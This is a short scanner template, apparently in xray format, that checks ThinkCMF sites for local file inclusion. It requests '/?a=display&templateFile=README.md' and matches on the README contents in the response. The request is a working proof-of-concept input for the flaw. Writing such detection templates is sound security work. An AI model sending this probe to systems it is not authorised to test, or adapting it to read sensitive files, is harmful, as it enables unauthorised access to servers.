id: thinkcmf-lfi

info:
    name: Thinkcmf lfi
    author: JerryKing
    severity: high

rules:
    r0:
        request:
            method: GET
            path: /?a=display&templateFile=README.md
        expression: response.status == 200 && response.body.bcontains(bytes(string(b"ThinkCMF"))) && response.body.bcontains(bytes(string(b"## README")))
expression: r0()
